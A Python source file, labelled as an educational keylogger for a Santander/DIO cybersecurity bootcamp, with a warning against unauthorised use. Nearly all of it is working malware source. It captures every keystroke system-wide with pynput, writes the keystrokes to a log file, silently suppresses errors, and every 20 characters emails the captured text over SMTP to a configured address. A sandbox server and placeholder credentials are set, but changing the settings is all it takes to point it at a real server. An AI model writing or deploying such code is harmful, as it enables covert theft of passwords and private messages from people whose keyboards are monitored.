#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Keylogger para fins educacionais - Bootcamp Cibersegurança Santander/DIO
AVISO: Use apenas em ambientes controlados e com autorização explícita.
Uso não autorizado é ilegal e antiético.
"""

import pynput
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import threading
import time

LOG_FILE = "log.txt"
BACKUP_LOG = "log_backup.txt"
EMAIL_TO = "usuario1@test.com"
EMAIL_FROM = "usuario2@test.com"
SMTP_SERVER = "sandbox.smtp.mailtrap.io"
SMTP_PORT = 2525
SMTP_USER = "coloque_aqui_sua_credencial_username_mailtrap"
SMTP_PASS = "coloque_aqui_sua_credencial_password_mailtrap"
USE_AUTH = True
CHAR_THRESHOLD = 20

char_count = 0
log_lock = threading.Lock()

def write_to_log(key_data):
    """Escreve dados no arquivo de log"""
    global char_count
    try:
        with log_lock:
            if not os.path.exists(LOG_FILE):
                with open(LOG_FILE, "w", encoding="utf-8") as f:
                    f.write("")
            
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(key_data)
            char_count += len(key_data)
            
            if char_count >= CHAR_THRESHOLD:
                threading.Thread(target=send_email_log, daemon=True).start()
                char_count = 0
    except Exception as e:
        pass

def format_key(key):
    """Formata a tecla pressionada para string legível"""
    try:
        if hasattr(key, 'char') and key.char:
            return key.char
        elif key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return " "
        elif key == keyboard.Key.tab:
            return " "
        elif key == keyboard.Key.backspace:
            return ""
        elif key == keyboard.Key.delete:
            return ""
        elif key == keyboard.Key.shift:
            return ""
        elif key == keyboard.Key.ctrl:
            return ""
        elif key == keyboard.Key.alt:
            return ""
        elif key == keyboard.Key.esc:
            return ""
        else:
            return ""
    except:
        return ""

def on_press(key):
    """Callback quando uma tecla é pressionada"""
    try:
        key_data = format_key(key)
        if key_data:
            write_to_log(key_data)
    except Exception as e:
        pass

def send_email_log():
    """Envia o arquivo de log por email"""
    log_content = ""
    try:
        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
            return
        
        with log_lock:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                log_content = f.read()
            
            with open(LOG_FILE, "w", encoding="utf-8") as f:
                f.write("")
        
        if not log_content.strip():
            return
        
        msg = MIMEMultipart()
        msg['From'] = EMAIL_FROM
        msg['To'] = EMAIL_TO
        msg['Subject'] = f"Keylogger Log - {time.strftime('%Y-%m-%d %H:%M:%S')}"
        msg.attach(MIMEText(log_content, 'plain', 'utf-8'))
        
        server = None
        try:
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10)
            
            if SMTP_PORT == 587:
                server.starttls()
            elif SMTP_PORT == 465:
                server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, timeout=10)
            
            if USE_AUTH and SMTP_USER and SMTP_PASS:
                server.login(SMTP_USER, SMTP_PASS)
            
            server.sendmail(EMAIL_FROM, EMAIL_TO, msg.as_string())
            server.quit()
            
        except Exception as e:
            if server:
                try:
                    server.quit()
                except:
                    pass
            raise
        
    except Exception as e:
        try:
            if log_content:
                try:
                    with open(BACKUP_LOG, "a", encoding="utf-8") as f:
                        f.write(log_content)
                except:
                    pass
                with log_lock:
                    with open(LOG_FILE, "a", encoding="utf-8") as f:
                        f.write(log_content)
        except:
            pass

def on_release(key):
    """Callback quando uma tecla é solta"""
    if key == keyboard.Key.esc:
        return False

def main():
    """Função principal - inicia o keylogger"""
    global LOG_FILE
    try:
        current_dir = os.getcwd()
        log_path = os.path.join(current_dir, LOG_FILE)
        
        with open(log_path, "w", encoding="utf-8") as f:
            f.write("")
        
        LOG_FILE = os.path.abspath(log_path)
    except Exception as e:
        try:
            with open(LOG_FILE, "w", encoding="utf-8") as f:
                f.write("")
        except:
            pass
    
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()

if __name__ == "__main__":
    main()
